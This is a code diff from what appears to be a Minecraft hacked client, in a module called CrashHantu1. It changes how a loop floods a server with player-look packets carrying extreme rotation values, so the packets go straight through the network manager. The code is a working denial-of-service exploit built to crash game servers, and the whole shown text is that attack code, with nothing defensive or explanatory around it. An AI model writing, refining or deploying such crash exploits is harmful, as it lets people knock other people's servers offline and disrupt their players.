@@ -22,7 +22,7 @@ public class CrashHantu1 extends Crash {
         (new Thread(() -> {
             try {
                 for (int i = 0; i < packets; ++i) {
-                    Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C05PacketPlayerLook(9.223372E18f, 9.223372E18f, true));
+                    Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C03PacketPlayer.C05PacketPlayerLook(9.223372E18f, 9.223372E18f, true));
                 }
             } catch (Exception ignored) {
             }
